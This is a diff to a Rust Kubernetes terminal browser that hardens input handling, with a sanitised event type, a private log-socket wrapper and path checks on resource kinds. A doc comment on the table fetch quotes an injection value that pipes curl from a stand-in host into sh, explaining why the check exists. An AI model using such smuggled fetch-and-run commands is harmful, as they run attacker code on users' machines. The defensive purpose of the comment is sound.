@@ -686,15 +686,42 @@ impl Bounded for Table {
     }
 }
 
+/// **What one object's events fetch keeps** (§ ONE OBJECT'S OWN STORY).
+///
+/// **Here rather than beside [`Happening`], for [`Bounded for Browsable`](Browsable)'s reason**:
+/// this region is the field list `k8s_tests.rs` derives its guard from, so a field added to that
+/// type and forgotten *here* fails a test instead of putting a controller's sentence on a terminal
+/// unstripped. It landed a phase after the guard was written and spent that time covered by a spot
+/// test, which proves today's two fields and says nothing about tomorrow's third.
+///
+/// **A `message` is [`FREE_TEXT`] and a `reason` is an [`IDENTIFIER`]** — D146's rule read off what
+/// the value is drawn as: one is a sentence, the other a word [`Happening::plainly`] compares with
+/// `==`. **As a cell and not as a document** (NOTES § D198): an event is one row among others, so
+/// a `\n` in a message would open a row that looks like a second event, and [`text`]'s
+/// substitution is right here exactly where [`clean`]'s retention is right there.
+///
+/// **The three remaining fields carry no text at all** — two timestamps and a count — which is why
+/// this impl is two lines and not five.
+impl Bounded for Happening {
+    fn bound(&mut self) {
+        text(&mut self.reason, IDENTIFIER);
+        text(&mut self.message, FREE_TEXT);
+    }
+}
+
 /// **The whole of what happens to an API object on its way into the store**: decode, which is
 /// the prune, then strip and bound.
 ///
 /// One function so there is one answer — a second entry point into the store is a second place
-/// to forget the guard. [`Watch::take`] for a watched object, [`Store::owner_fetched`] for a
-/// ReplicaSet fetched by uid, [`browsable`] for a kind discovery named, and the browser's
-/// [`Table`] for either shape a list comes back in. **The doc said *the only caller* until
-/// 2026-08-22** and the second one had landed a box earlier; the count is not the point, and it
-/// is not kept here any more — the single door is.
+/// to forget the guard. A watched object, a ReplicaSet fetched by uid, a kind discovery named,
+/// either shape the browser's list comes back in, a node's usage, one pod re-read for `describe`,
+/// one event of an object's own story: all of them here, and none of them named.
+///
+/// **The doc said *the only caller* until 2026-08-22**, then listed four while there were six
+/// (`dev-core`'s second pass, 2026-08-31, adding the seventh). A list of callers in a doc comment
+/// is stale the turn after it is written and nothing fails when it goes: the *count* is not the
+/// point and neither are the names — the single door is, and `k8s_tests.rs` is what checks that
+/// every type coming through it is covered.
 ///
 /// **The `From` is what makes the door unavoidable for the browser's rows.** [`Table`] does not
 /// implement `Deserialize`, so `Client::request::<Table>` cannot compile: the only way to hold one
@@ -4310,11 +4337,29 @@ impl Fetch {
     /// that source is `--namespace`: the namespace picker further down Phase 5 is fed from the
     /// cluster's own list, and `x?watch=true` puts a query parameter on a call the command log
     /// prints without one.
+    ///
+    /// **[`Browsable::kind`] is judged too, and it is the one word here that builds no path
+    /// segment.** `url_path` reads the group, the version and the plural; the kind is what
+    /// `main.rs` lowercases into the `$ kubectl get …` line the reader is *taught*, and that line
+    /// ends in a shell the user runs. A kind of `pod; curl http://evil.invalid/x | sh` printed
+    /// `$ kubectl get pod; curl http://evil.invalid/x | sh # web -n default …`, which pasted runs
+    /// the `curl` and comments the rest out — `sanitize` removes an `ESC` and leaves every
+    /// character a shell reads (`k8s-admin`, 2026-08-31). **So it is checked at the one place
+    /// every consumer routes through** rather than at the printer: the browser opens a row by this
+    /// function and `--yaml` builds its fetch by it, and a guard added to the `format!` would be a
+    /// guard the next consumer does not get.
+    ///
+    /// **A CRD cannot carry such a kind and an aggregated API server is the residual.** Measured
+    /// by server dry-run against the fixture cluster, `spec.names.kind` is validated against
+    /// `[a-z]([-a-z0-9]*[a-z0-9])?` with mixed case allowed, so the CRD door is shut by the API
+    /// server. Whether kube-apiserver validates the `kind` word in an *extension* server's
+    /// discovery document was not measured, and this clause is what makes the answer not matter.
     pub fn table(kind: &Browsable, namespace: Option<&str>) -> Option<Self> {
         let namespace = kind.namespaced.then_some(namespace).flatten();
         if !(kind.group.is_empty() || path_safe(&kind.group))
             || !path_safe(&kind.version)
             || !path_safe(&kind.plural)
+            || !path_safe(&kind.kind)
             || namespace.is_some_and(|namespace| !path_safe(namespace))
         {
             return None;
@@ -5081,11 +5126,11 @@ fn hold(held: &mut Vec<u8>, more: &[u8], overran: &mut bool) {
 /// **The last line is emitted even with no newline after it.** A log that ends mid-line is what a
 /// container killed while writing produces, and dropping it would lose the one line a crash is
 /// most likely to be explained by.
-pub(crate) async fn read_lines(
-    reader: impl AsyncRead,
+pub(crate) async fn read_lines<R: AsyncRead>(
+    socket: LogSocket<R>,
     mut line: impl FnMut(String) -> bool,
 ) -> std::io::Result<()> {
-    let mut reader = Box::pin(reader);
+    let mut reader = Box::pin(socket.0);
     let mut chunk = [0_u8; LOG_READ];
     let mut held: Vec<u8> = Vec::new();
     let mut overran = false;
@@ -5233,10 +5278,46 @@ impl LogRequest {
 pub(crate) async fn log_stream(
     client: &Client,
     request: &LogRequest,
-) -> Result<impl AsyncBufRead + use<>, kube::Error> {
+) -> Result<LogSocket<impl AsyncBufRead + use<>>, kube::Error> {
     Api::<Pod>::namespaced(client.clone(), &request.namespace)
         .log_stream(&request.pod, &request.params())
         .await
+        .map(LogSocket)
+}
+
+/// **The socket a container's log arrives on, and the only thing [`read_lines`] will read.**
+///
+/// **A wrapper with a private field, and the field is the whole of it.** [`log_stream`] is
+/// `pub(crate)` because `main.rs` needs the open failure to build its own sentence, which handed
+/// that file a live `impl AsyncBufRead` — and a caller holding one can decode it itself. Measured:
+/// the `--follow` arm rewritten to `Box::pin(reader).lines()`, with the fetch arm left calling
+/// [`read_lines`] so every guard's count still held, ran **868 tests green** with that path going
+/// through neither [`text`] (invariant 9), nor the [`FREE_TEXT`] cut, nor [`LINE_READ`]'s per-line
+/// ceiling — which is the security gate's *an endless log line must not be held whole in memory*
+/// (`k8s-admin`, 2026-08-31).
+///
+/// **So the guard is the compiler and not a test that reads source.** A source guard was written
+/// first and would not have caught that attack: `k8s::read_lines(` still appeared in the same
+/// function, because the arm that was rewritten was not the only arm. Nothing outside this file
+/// can name the field, so nothing outside this file can read these bytes.
+///
+/// **Generic rather than boxed**, so the wrapper costs no allocation and no `Send` bound — it
+/// exists to remove a capability, not to erase a type. **It carries no trait bound of its own**
+/// either: [`read_lines`] states what it needs of `R`, and a bound repeated on the struct is a
+/// second place for the two to disagree.
+pub(crate) struct LogSocket<R>(R);
+
+impl<R> LogSocket<R> {
+    /// **A socket over bytes that never came from a cluster** — `#[cfg(test)]`, so it is the one
+    /// door into this type and it does not exist in the shipped binary.
+    ///
+    /// `k8s_tests.rs` is a child module and reaches the field directly; `main_tests.rs` is not,
+    /// and this is what it uses. A call to it from product code is a release build that does not
+    /// compile, which is the loud half of the promise above.
+    #[cfg(test)]
+    pub(crate) fn over(reader: R) -> Self {
+        Self(reader)
+    }
 }
 
 /// **The annotation an injector sets so `kubectl logs` lands on the application and not the
@@ -5414,11 +5495,17 @@ pub(crate) async fn pod(
 //
 // **The tree is `serde_yaml_ng::Value` and not `serde_json::Value`, for one measured reason.**
 // `serde_json::Map` is a `BTreeMap` unless `preserve_order` is on, so a round trip through it
-// alphabetises every key — `apiVersion`, `kind`, `metadata`, `spec`, `status` would come back
-// in an order no API server ever sent, and *key order is the API's, never alphabetised* is that
-// pane's whole contract with a reader who already knows what `kubectl get -o yaml` looks like.
-// `serde_yaml_ng::Mapping` is an `IndexMap` (`mapping.rs:14-16`), so it keeps the order the JSON
-// arrived in.
+// alphabetises every key — `apiVersion`, `kind`, `metadata`, `spec`, `status` would come back in
+// an order no API server ever sent, which is a document rebuilt by this file rather than relayed
+// by it. `serde_yaml_ng::Mapping` is an `IndexMap` (`mapping.rs:14-16`), so it keeps the order the
+// JSON arrived in and this file reorders nothing.
+//
+// **What this is *not* is a claim about matching `kubectl`, and the sentence here said that until
+// 2026-08-31.** `kubectl get -o yaml` **alphabetises** — measured on `kube-system/coredns`, 43
+// lines from each, every key and every value present in both, and the top level came back
+// `apiVersion, data, kind, metadata` against this pane's `kind, apiVersion, metadata, data`
+// (`k8s-admin`). Same object, different bytes. The choice above stands on its own reason; it never
+// stood on that one.
 //
 // **Every string in either shape goes through the ingest guard** (§ THE INGEST GUARD,
 // invariant 9). An event's `message` and `reason` are written by whoever can make a controller
@@ -5618,7 +5705,7 @@ pub(crate) async fn events(
         .list(&asked)
         .await?;
     let cut = answered.metadata.continue_.is_some();
-    let mut lines: Vec<Happening> = answered.items.into_iter().map(happening).collect();
+    let mut lines: Vec<Happening> = answered.items.into_iter().map(ingest).collect();
     // **Reversed before the sort, and that is the whole of finding 9.** A legacy event's
     // `lastTimestamp` has *second* resolution, so an ordinary pod startup stamps Scheduled,
     // Pulled, Created and Started in the same second; the sort below is stable, so those four
@@ -5640,38 +5727,39 @@ pub(crate) async fn events(
     Ok(Happened { lines, cut })
 }
 
-/// One `Event` off the wire, through the ingest guard (§ THE INGEST GUARD).
+/// **One `Event` off the wire, pruned to the five fields [`Happening`] carries** — the decode
+/// half of [`ingest`], with the strip and the bound its other half
+/// ([`Bounded for Happening`](Happening)).
 ///
-/// **A message is [`FREE_TEXT`] and a reason is an [`IDENTIFIER`]**, which is that guard's own
-/// rule read off what the value is drawn as: one is a sentence, the other a word compared with
-/// `==`.
-fn happening(event: ClusterEvent) -> Happening {
-    let mut reason = event.reason.unwrap_or_default();
-    let mut message = event.message.unwrap_or_default();
-    text(&mut reason, IDENTIFIER);
-    text(&mut message, FREE_TEXT);
-    let series = event.series;
-    Happening {
-        at: event
-            .last_timestamp
-            .or_else(|| {
-                series
-                    .as_ref()
-                    .and_then(|series| series.last_observed_time.as_ref())
-                    .map(|at| Time(at.0))
-            })
-            .or_else(|| event.event_time.map(|at| Time(at.0)))
-            .or_else(|| event.metadata.creation_timestamp.clone()),
-        reason,
-        message,
-        count: event
-            .count
-            .or_else(|| series.as_ref().and_then(|s| s.count)),
-        // **`firstTimestamp` and not `eventTime`**, even though the modern shape puts the first
-        // occurrence there: `eventTime` is already read above as a *last* stamp for an event with
-        // no series, and one field cannot honestly be both. A modern event with a series and no
-        // `firstTimestamp` draws the count without a span rather than a span this file guessed.
-        first: event.first_timestamp.or(event.metadata.creation_timestamp),
+/// **A `From` rather than a free function, so the events fetch comes through the same one door
+/// every other read does** (§ THE INGEST GUARD): a second entry point into a snapshot type is a
+/// second place to forget the guard, and this type had one until 2026-08-31.
+impl From<ClusterEvent> for Happening {
+    fn from(event: ClusterEvent) -> Self {
+        let series = event.series;
+        Happening {
+            at: event
+                .last_timestamp
+                .or_else(|| {
+                    series
+                        .as_ref()
+                        .and_then(|series| series.last_observed_time.as_ref())
+                        .map(|at| Time(at.0))
+                })
+                .or_else(|| event.event_time.map(|at| Time(at.0)))
+                .or_else(|| event.metadata.creation_timestamp.clone()),
+            reason: event.reason.unwrap_or_default(),
+            message: event.message.unwrap_or_default(),
+            count: event
+                .count
+                .or_else(|| series.as_ref().and_then(|s| s.count)),
+            // **`firstTimestamp` and not `eventTime`**, even though the modern shape puts the
+            // first occurrence there: `eventTime` is already read above as a *last* stamp for an
+            // event with no series, and one field cannot honestly be both. A modern event with a
+            // series and no `firstTimestamp` draws the count without a span rather than a span
+            // this file guessed.
+            first: event.first_timestamp.or(event.metadata.creation_timestamp),
+        }
     }
 }
 
@@ -5859,7 +5947,31 @@ fn clean(value: &mut serde_yaml_ng::Value) {
             }
             *held = cleaned;
         }
-        _ => {}
+        // **A `!Tag` cannot come out of the decoder this file uses, whatever any server sends, and
+        // the arm is here anyway.** The chain is three links and every one of them was read rather
+        // than assumed (`k8s-admin`, 2026-08-31): `serde_yaml_ng::Value::Tagged` is built only in
+        // `visit_enum` (`value/de.rs:109-115`), `Value::deserialize` asks for `deserialize_any`
+        // (`value/de.rs:119`), and this path decodes with `serde_json::from_str`
+        // (`kube-client-4.2.0/src/client/mod.rs:281-291`), which never answers `deserialize_any`
+        // with `visit_enum`. No product file parses YAML *text* at all. So the reachability is a
+        // property of the decoder and not a hope about clusters — an earlier draft of this comment
+        // hedged that it could not be proven, and it can.
+        //
+        // What the arm buys is the `_ => {}` it replaces: `Value` carries no `#[non_exhaustive]`
+        // (`value/mod.rs:26`, read), so a variant added to the crate is now a build failure here
+        // rather than a position nothing walks — the only structural guard an untyped tree can
+        // have, since there is no field list to derive. It is exercised through the YAML parser,
+        // which is the one thing that can build one
+        // (`clean_reaches_a_string_in_every_position_a_document_can_hold_one`, which also feeds
+        // four adversarial JSON bodies and asserts none of them decodes to a tag).
+        //
+        // **The tag's own word is left alone, and that is a trade rather than an oversight.**
+        // `Tag`'s string is private and `Tag::new` *panics* on an empty one, so rebuilding a
+        // stripped tag would answer invariant 9 with a crash on the one input that empties it.
+        serde_yaml_ng::Value::Tagged(tagged) => clean(&mut tagged.value),
+        serde_yaml_ng::Value::Null
+        | serde_yaml_ng::Value::Bool(_)
+        | serde_yaml_ng::Value::Number(_) => {}
     }
 }
 
